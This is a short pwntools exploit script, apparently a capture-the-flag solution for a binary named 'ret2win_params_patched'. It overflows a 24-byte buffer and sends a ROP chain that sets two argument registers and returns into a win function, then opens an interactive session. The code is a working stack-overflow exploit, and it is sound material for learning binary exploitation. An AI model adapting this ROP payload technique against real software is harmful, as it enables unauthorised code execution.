#!/usr/bin/env python3

from pwn import *

exe = ELF("./ret2win_params_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    r.sendlineafter(b':', b'A'*24 + p64(0x40124b) + p64(0xdeadbeefdeadbeef) + p64(0x401249) + p64(0xc0debabec0debabe) + p64(0x0) + p64(0x401142))
    r.interactive()


if __name__ == "__main__":
    main()
